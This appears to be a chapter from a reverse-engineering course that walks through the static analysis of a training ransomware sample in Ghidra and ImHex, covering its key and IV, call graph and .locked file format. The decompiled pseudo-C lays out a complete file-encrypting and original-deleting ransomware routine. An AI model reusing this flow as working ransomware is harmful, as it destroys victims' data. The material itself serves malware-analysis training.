🔝 Back to [Table of Contents](/TABLE-OF-CONTENTS.md)

# 27.3 — Static Analysis: Ghidra + ImHex (Spotting AES Constants, Encryption Flow)

> 🔍 **Goal of this section**: move from triage (hypotheses) to in-depth analysis (certainties). We will import the sample into Ghidra to reconstruct the encryption flow function by function, then use ImHex to map the cryptographic constants in the binary and analyze the format of the `.locked` files produced.  
>  
> We are working on the **`ransomware_O2_strip`** variant (optimized, without symbols). Screenshots and addresses may vary depending on your environment, but the patterns remain identical.

---

## Part A — Analysis in Ghidra

### Import and auto-analysis

Launch Ghidra, create a dedicated project (e.g., `Ch27-Ransomware`), then import `ransomware_O2_strip` via *File → Import File*. Ghidra automatically detects the ELF x86-64 format. Accept the default options and launch auto-analysis (*Auto Analyze*) with at least the following checked:

- **Decompiler Parameter ID** — reconstructs function parameters  
- **Aggressive Instruction Finder** — important for a stripped binary  
- **Function Start Search** — heuristics for detecting function prologues  
- **Shared Return Calls** — detects functions sharing an epilogue (common with `-O2`)

The analysis takes a few seconds on a sample this size. Once complete, the CodeBrowser opens with the disassembly listing on the left and the decompiler on the right.

### Navigating a stripped binary

Without symbols, Ghidra assigns generic names to internal functions: `FUN_00101340`, `FUN_001014a0`, etc. Only functions imported from shared libraries retain their names (`EVP_EncryptInit_ex`, `opendir`, `fopen`...) because they are part of the `.dynsym` table.

Our exploration strategy therefore relies on these **named anchor points**. We will start from the OpenSSL functions — whose existence we know from the triage — and trace back to the internal functions that call them.

### Locating OpenSSL EVP API calls

Open the *Symbol Tree* window (on the left) and expand the *Imports* or *External Functions* section. You will find the imported OpenSSL functions. Alternatively, use the filter in the *Symbol Table* window (*Window → Symbol Table*) and type `EVP`:

```
EVP_CIPHER_CTX_new  
EVP_CIPHER_CTX_free  
EVP_EncryptInit_ex  
EVP_EncryptUpdate  
EVP_EncryptFinal_ex  
EVP_aes_256_cbc  
```

The presence of `EVP_aes_256_cbc` is a direct confirmation of the algorithm: this function returns a pointer to the structure describing AES-256-CBC in OpenSSL. Its call is the code equivalent of stating "I'm using AES-256 in CBC mode."

### Tracing back from `EVP_EncryptInit_ex` via cross-reference

Right-click on `EVP_EncryptInit_ex` in the Symbol Tree, then *References → Show References to*. Ghidra displays the list of code locations that call this function. On our sample, there will be only **one call** — this is the internal function that encapsulates the encryption. Double-click on the reference to navigate to the call site.

You land in a function that Ghidra names something like `FUN_001013a0`. The decompiler displays pseudo-C code resembling this (generic names, approximate types):

```c
undefined8 FUN_001013a0(uchar *param_1, int param_2, uchar *param_3, int *param_4)
{
    EVP_CIPHER_CTX *ctx;
    int local_len;
    
    ctx = EVP_CIPHER_CTX_new();
    if (ctx == (EVP_CIPHER_CTX *)0x0) {
        fprintf(stderr, "[!] EVP_CIPHER_CTX_new failed\n");
        return 0xffffffff;  // return -1
    }
    
    iVar1 = EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), (ENGINE *)0x0,
                                &DAT_00104020,   // ← AES key
                                &DAT_00104040);  // ← IV
    if (iVar1 != 1) { ... }
    
    iVar1 = EVP_EncryptUpdate(ctx, param_3, &local_len, param_1, param_2);
    if (iVar1 != 1) { ... }
    *param_4 = local_len;
    
    iVar1 = EVP_EncryptFinal_ex(ctx, param_3 + local_len, &local_len);
    if (iVar1 != 1) { ... }
    *param_4 = *param_4 + local_len;
    
    EVP_CIPHER_CTX_free(ctx);
    return 0;  // success
}
```

> 💡 The pseudo-code above is a simplified reconstruction. Ghidra's decompiler will produce a slightly different result depending on the version and analysis options, but the structure — `Init`, `Update`, `Final` — will always be recognizable.

#### Identifying the key and IV

The two crucial parameters of `EVP_EncryptInit_ex` are the 4th argument (the key) and the 5th argument (the IV). In the decompiled pseudo-code, they appear as references to addresses in the `.rodata` section: `DAT_00104020` and `DAT_00104040` (exact addresses will vary).

Double-click on `DAT_00104020` to navigate to that address in the listing. You will see 32 consecutive bytes:

```
00104020  52 45 56 45 52 53 45 5f  45 4e 47 49 4e 45 45 52   REVERSE_ENGINEER
00104030  49 4e 47 5f 49 53 5f 46  55 4e 5f 32 30 32 35 21   ING_IS_FUN_2025!
```

This is the **AES-256 key** identified during triage. Hypothesis H3 is now **confirmed**: this memory address is indeed the one passed to `EVP_EncryptInit_ex` as the key parameter.

Then navigate to `DAT_00104040`:

```
00104040  de ad be ef ca fe ba be  13 37 42 42 fe ed fa ce   ................
```

The 16 bytes of the **IV** — hypothesis H4 confirmed.

#### Renaming and annotation

Even though we are working on a stripped binary, nothing prevents us from enriching the analysis in Ghidra. Let's rename the identified elements to improve readability:

| Original element | New name | Reason |  
|---|---|---|  
| `FUN_001013a0` | `aes256cbc_encrypt` | Encapsulates EVP encryption |  
| `DAT_00104020` | `AES_KEY` | 32-byte key passed to `EncryptInit` |  
| `DAT_00104040` | `AES_IV` | 16-byte IV passed to `EncryptInit` |

To rename, click on the name then press `L` (or right-click → *Rename*). Add a comment with `;` (pre-comment) or `Ctrl+;` (post-comment) to note your observations. For example, on the key address: "AES-256 key: REVERSE_ENGINEERING_IS_FUN_2025! — confirmed via XREF to EVP_EncryptInit_ex."

### Tracing back to the file encryption function

Now that `aes256cbc_encrypt` is identified, let's find who calls it. Right-click on the function name → *References → Show References to*. The sole caller is the function we will rename `encrypt_file`.

The decompiler for this function reveals the following flow (cleaned-up pseudo-code):

```c
int encrypt_file(char *input_path)
{
    FILE *fp_in = fopen(input_path, "rb");
    // ... error checks ...
    
    fseek(fp_in, 0, SEEK_END);
    long file_size = ftell(fp_in);
    fseek(fp_in, 0, SEEK_SET);
    
    uchar *plaintext = malloc(file_size);
    fread(plaintext, 1, file_size, fp_in);
    fclose(fp_in);
    
    uchar *ciphertext = malloc(file_size + 16);  // + EVP_MAX_BLOCK_LENGTH
    int ciphertext_len;
    aes256cbc_encrypt(plaintext, file_size, ciphertext, &ciphertext_len);
    free(plaintext);
    
    // Build output path: input_path + ".locked"
    snprintf(out_path, 4096, "%s.locked", input_path);
    
    FILE *fp_out = fopen(out_path, "wb");
    fwrite("RWARE27\0", 1, 8, fp_out);           // magic header
    fwrite(&file_size, sizeof(uint64_t), 1, fp_out);  // original size
    fwrite(ciphertext, 1, ciphertext_len, fp_out);     // encrypted data
    fclose(fp_out);
    free(ciphertext);
    
    unlink(input_path);  // delete original
    return 0;
}
```

Several elements stand out:

1. **Full read into memory** — The entire file is loaded via `fread` before being encrypted in a single call to `aes256cbc_encrypt`. No iterative block-by-block encryption from the file.  
2. **`.locked` file header** — Three successive writes with `fwrite`: magic (`RWARE27\0`, 8 bytes), original size (`uint64_t`, 8 bytes), then the encrypted data. The header is therefore **16 bytes** total.  
3. **Original deletion** — The `unlink` call after closing the output file confirms the destructive behavior.  
4. **Path concatenation** — `snprintf` with `"%s.locked"` confirms the appended extension.

Let's rename this function `encrypt_file` and add a summary comment at the top.

### Tracing back to the directory traversal

Going one level up via XREF from `encrypt_file`, we reach the recursive traversal function. The decompiler shows a typical `opendir` / `readdir` / `closedir` loop:

```c
void traverse_directory(char *dir_path, int *count)
{
    DIR *d = opendir(dir_path);
    // ...
    while ((entry = readdir(d)) != NULL) {
        // strcmp(entry->d_name, ".") and strcmp(entry->d_name, "..")
        // ... should_skip() filtering ...
        
        stat(full_path, &st);
        
        if (S_ISDIR(st.st_mode)) {
            traverse_directory(full_path, count);  // recursive call
        } else if (S_ISREG(st.st_mode)) {
            encrypt_file(full_path);
            *count = *count + 1;
        }
    }
    closedir(d);
}
```

The recursion is identifiable by the fact that the function calls itself (circular XREF). The `stat` calls followed by mode bit tests (`S_ISDIR`, `S_ISREG`) are a classic pattern for filesystem traversal in C.

We also spot a call to a small filtering function (which we will rename `should_skip`) that performs string comparisons against `.locked` and `README_LOCKED.txt` to avoid re-encrypting already processed files or the ransom note.

### Tracing back to `main`

The last level is the `main` function, accessible via XREF from `traverse_directory`. In a stripped PIE binary, Ghidra often identifies `main` automatically through the `__libc_start_main` calling convention (whose first argument is the pointer to `main`). If not, search for `__libc_start_main` in the imports and follow its XREF to identify the function passed as the first argument — that's `main`.

The `main` pseudo-code reveals the overall sequence:

```c
int main(int argc, char **argv)
{
    print_banner();
    
    // stat() on "/tmp/test" → verify directory exists
    if (stat("/tmp/test", &st) != 0 || !S_ISDIR(st.st_mode)) {
        fprintf(stderr, "[!] Target directory missing: /tmp/test\n");
        return 1;
    }
    
    int count = 0;
    traverse_directory("/tmp/test", &count);
    
    if (count > 0) {
        drop_ransom_note("/tmp/test");
        printf("[*] %d file(s) encrypted.\n", count);
    }
    
    return 0;
}
```

### Reconstructed call graph

At this point, we can draw the complete call graph of the sample. In Ghidra, open *Window → Function Call Graph* for an automatic visualization, or reconstruct it manually:

```
main()
 ├── print_banner()
 │     └── printf()
 ├── stat()                          [checks /tmp/test]
 ├── traverse_directory()
 │     ├── opendir()
 │     ├── readdir()                 [loop]
 │     ├── stat()                    [file/directory type]
 │     ├── should_skip()
 │     │     ├── strlen()
 │     │     └── strcmp()            [".locked", "README_LOCKED.txt"]
 │     ├── traverse_directory()      [recursion on subdirectories]
 │     ├── encrypt_file()
 │     │     ├── fopen() / fseek() / ftell() / fread() / fclose()
 │     │     ├── malloc() / free()
 │     │     ├── aes256cbc_encrypt()
 │     │     │     ├── EVP_CIPHER_CTX_new()
 │     │     │     ├── EVP_aes_256_cbc()
 │     │     │     ├── EVP_EncryptInit_ex()   [AES_KEY, AES_IV]
 │     │     │     ├── EVP_EncryptUpdate()
 │     │     │     ├── EVP_EncryptFinal_ex()
 │     │     │     └── EVP_CIPHER_CTX_free()
 │     │     ├── snprintf()          ["%s.locked"]
 │     │     ├── fopen() / fwrite() / fclose()
 │     │     └── unlink()            [delete original]
 │     └── closedir()
 └── drop_ransom_note()
       ├── snprintf()                [note path]
       ├── fopen()
       ├── fputs()                   [note content]
       └── fclose()
```

This graph is the central result of the static analysis in Ghidra. It captures the program's entire behavior in a readable structure. Export it to your working notes.

### Ghidra renaming summary

At the end of the Ghidra analysis, your Symbol Tree should contain the following renames:

| Address (example) | Original Ghidra name | Assigned name | Role |  
|---|---|---|---|  
| `0x001011e0` | `FUN_001011e0` | `print_banner` | Displays the execution banner |  
| `0x00101240` | `FUN_00101240` | `should_skip` | Filters `.locked` and the ransom note |  
| `0x001012b0` | `FUN_001012b0` | `traverse_directory` | Recursive traversal of `/tmp/test` |  
| `0x001013a0` | `FUN_001013a0` | `aes256cbc_encrypt` | AES-256-CBC encryption via EVP |  
| `0x00101480` | `FUN_00101480` | `encrypt_file` | Reads, encrypts, writes `.locked`, deletes |  
| `0x00101620` | `FUN_00101620` | `drop_ransom_note` | Writes `README_LOCKED.txt` |  
| `0x00101690` | `FUN_00101690` | `main` | Logical entry point |  
| `0x00104020` | `DAT_00104020` | `AES_KEY` | AES-256 key (32 bytes) |  
| `0x00104040` | `DAT_00104040` | `AES_IV` | AES IV (16 bytes) |

> 💡 The addresses are indicative and will vary depending on your compilation. What matters is the **process**: start from named imports, trace back via XREF, rename and annotate as you go.

---

## Part B — Analysis in ImHex

ImHex serves two purposes in this analysis: examining the **ELF binary** itself (to visualize crypto constants in context) and examining the **`.locked` files produced** (to map the output format).

### Locating crypto constants in the ELF binary

Open `ransomware_O2_strip` in ImHex. We will locate the cryptographic constants that Ghidra identified for us, but this time in their raw hexadecimal context.

#### Searching for the AES key

Use *Edit → Find → Hex Pattern* and search for the hex sequence corresponding to the beginning of the key:

```
52 45 56 45 52 53 45 5F
```

ImHex highlights the occurrence. Select the 32 bytes from this position and create a **bookmark** (*Edit → Bookmark Selection*) named `AES-256 Key`. In the Data Inspector panel on the right, the `ASCII String` type displays `REVERSE_ENGINEERING_IS_FUN_2025!`.

#### Searching for the IV

Next, search for the sequence:

```
DE AD BE EF CA FE BA BE
```

The 16 bytes from this position constitute the IV. Create a second bookmark named `AES IV`. Note the proximity in memory between the key and the IV: they are typically consecutive or very close in `.rodata`, because they are declared as adjacent `static const` variables in the source code.

#### Visualization with a minimal `.hexpat` pattern

To make this inspection reproducible, we can write a mini ImHex pattern that identifies these constants in the `.rodata` section. This is not a pattern for the `.locked` format (that comes next) but a spotting tool for the ELF binary:

```hexpat
// ImHex pattern: spotting crypto constants in the ELF binary
// Usage: place the cursor at the beginning of the key found via hex search

struct CryptoConstants {
    char aes_key[32]   [[comment("AES-256 Key"), color("FF6B6B")]];
    char aes_iv[16]    [[comment("AES IV (CBC)"), color("4ECDC4")]];
};

CryptoConstants constants @ 0x____;  // Replace with the offset you found
```

Replace `0x____` with the offset of the first byte of the key in your binary. This pattern will colorize the key in red and the IV in turquoise, making their location immediately visual.

> ⚠️ This offset is a **file offset**, not a virtual address. ImHex works on the raw file, not the memory image. If Ghidra gives you a virtual address, use *Navigation → Go To* in Ghidra in "File Offset" mode to get the mapping, or calculate it via the ELF segment headers (`readelf -l`).

### Mapping the `.locked` file format

This is where ImHex shows its full power. Run the sample in your sandboxed VM (after taking a snapshot), then open one of the produced `.locked` files in ImHex.

#### Raw observation

The first bytes of the `.locked` file look like this:

```
Offset    00 01 02 03 04 05 06 07  08 09 0A 0B 0C 0D 0E 0F
00000000  52 57 41 52 45 32 37 00  xx xx xx xx xx xx xx xx   RWARE27.........
00000010  [encrypted data ........................................]
```

The magic `RWARE27\0` is immediately recognizable in the first 8 bytes. The next 8 bytes (offsets `0x08` to `0x0F`) are the original file size as a `uint64_t` little-endian. Starting from offset `0x10`, it's the AES-256-CBC encrypted stream.

#### `.hexpat` pattern for the `.locked` format

Let's write a complete pattern that structures this view:

```hexpat
/*!
 * ImHex Pattern — .locked file format (Chapter 27)
 * Reverse Engineering Training
 *
 * Structure:
 *   [0x00 - 0x07]  Magic header "RWARE27\0"
 *   [0x08 - 0x0F]  Original file size (uint64_t LE)
 *   [0x10 - EOF ]  Encrypted data (AES-256-CBC, PKCS#7 padding)
 */

#pragma endian little

// --- Magic header ---
struct MagicHeader {
    char signature[7]  [[comment("Format identifier")]];
    u8   null_term     [[comment("Null terminator")]];
} [[color("FF6B6B"), name("Magic Header")]];

// --- Metadata ---
struct FileMetadata {
    u64 original_size  [[comment("File size before encryption")]];
} [[color("4ECDC4"), name("File Metadata")]];

// --- Encrypted data ---
struct EncryptedPayload {
    // Size = .locked file size - 16 bytes of header
    u8 data[std::mem::size() - 16]  [[comment("AES-256-CBC ciphertext + PKCS#7 padding")]];
} [[color("FFE66D"), name("Encrypted Data")]];

// --- Main structure ---
struct LockedFile {
    MagicHeader   header;
    FileMetadata  metadata;
    EncryptedPayload payload;
};

LockedFile file @ 0x00;
```

Load this pattern in ImHex via *File → Load Pattern* (or paste it in the Pattern Editor). The `.locked` file now displays with three distinct colored zones:

- **Red** — The magic header `RWARE27\0`  
- **Turquoise** — The original size (directly readable in the Data Inspector as a 64-bit integer)  
- **Yellow** — The encrypted payload

This visualization confirms the structure deduced from Ghidra and provides a reusable tool for inspecting any file produced by the sample.

#### Cross-checks

A few manual verifications strengthen confidence in the analysis:

**Payload size vs. original size** — The encrypted payload must be slightly larger than the original size, due to PKCS#7 padding. More precisely, its size must be the first multiple of 16 greater than or equal to the original size. If the original file was 45 bytes, the encrypted payload will be 48 bytes (3 bytes of padding added to reach 3 × 16). If the original file was exactly 32 bytes, the payload will be 48 bytes (16 bytes of padding added — a full block, because PKCS#7 always adds padding).

**Comparing two `.locked` files** — Use ImHex's *Diff* function (*File → Open Diff*) to compare two encrypted files. The magic headers will be identical, the original sizes will differ, and the payloads will be completely different (AES in CBC mode with the same IV produces different outputs as soon as the inputs differ, even by a single bit).

**Entropy** — ImHex's *View → Information → Entropy* panel displays an entropy curve by blocks. The header (16 bytes) will have moderate entropy (ASCII text + small integer), while the encrypted payload will show **entropy close to 1.0** (maximum), characteristic of encrypted or compressed data. This entropy profile — low at the beginning, maximum afterwards — is a typical visual signature of an encrypted format with a plaintext header.

---

## Summary: hypothesis table update

The in-depth static analysis allows us to promote several hypotheses to **confirmed facts** and add new ones:

| # | Hypothesis (section 27.2) | Status after static analysis | Evidence |  
|---|---|---|---|  
| H1 | Ransomware targeting `/tmp/test/` | **Confirmed** | String passed to `stat()` in `main()`, recursive traversal via `opendir`/`readdir` |  
| H2 | Algorithm AES-256-CBC | **Confirmed** | Call to `EVP_aes_256_cbc()` in `aes256cbc_encrypt` |  
| H3 | Key = `REVERSE_ENGINEERING_IS_FUN_2025!` | **Confirmed** | Address passed as 4th argument to `EVP_EncryptInit_ex`, 32 bytes in `.rodata` |  
| H4 | IV = `DEADBEEF CAFEBABE 1337 4242 FEEDFACE` | **Confirmed** | Address passed as 5th argument to `EVP_EncryptInit_ex`, 16 bytes in `.rodata` |  
| H5 | `RWARE27` header in `.locked` files | **Confirmed** | `fwrite` of 8 bytes in `encrypt_file`, verified in ImHex |  
| H6 | Recursive traversal + deletion of originals | **Confirmed** | Recursive call identified + `unlink()` in `encrypt_file` |  
| H7 | No network communication | **Strengthened** | No calls to `socket`, `connect`, `send`, `recv` in the call graph |  
| H8 | No anti-debug | **Strengthened** | No calls to `ptrace`, no reading of `/proc/self/status` |

New observations:

| # | Observation | Source |  
|---|---|---|  
| N1 | The file is read entirely into memory before encryption | `fseek`/`ftell`/`fread` in `encrypt_file` |  
| N2 | The original size is stored in the `.locked` header (offset `0x08`, `uint64_t` LE) | `fwrite` in `encrypt_file` + ImHex pattern |  
| N3 | The `.locked` header is exactly 16 bytes (8 magic + 8 size) | ImHex analysis |  
| N4 | `.locked` files and `README_LOCKED.txt` are excluded from encryption | `should_skip` function with `strcmp` |  
| N5 | Key and IV are static (no `RAND_bytes`, no derivation) | No calls to random generation functions in the call graph |

---

## What static analysis doesn't definitively confirm

Despite the rich results, static analysis has its inherent limitations:

- **Is the code actually executed as shown?** — The decompiler shows the code *as it could* execute, but branch conditions could steer execution toward alternative paths not observed. Only controlled execution will confirm this.  
- **Is the key identified in `.rodata` the one actually used at runtime?** — Although the XREF is direct, a more sophisticated binary could copy the key, transform it, or load a different key based on runtime conditions. Dynamic analysis (section 27.5) will lift this last uncertainty by capturing the actual arguments at call time.  
- **Is the behavior complete?** — The call graph shows the main flow, but dead code or rarely-reached branches could exist (residual debug functions, complex error paths). A pass with dynamic analysis using code coverage (`Frida Stalker` or `gcov`) could complete the picture.

These questions will be addressed in section 27.5, where we will set breakpoints on critical functions and observe the program's actual runtime behavior.

⏭️ [Identifying corresponding YARA rules from ImHex](/27-ransomware/04-yara-rules.md)
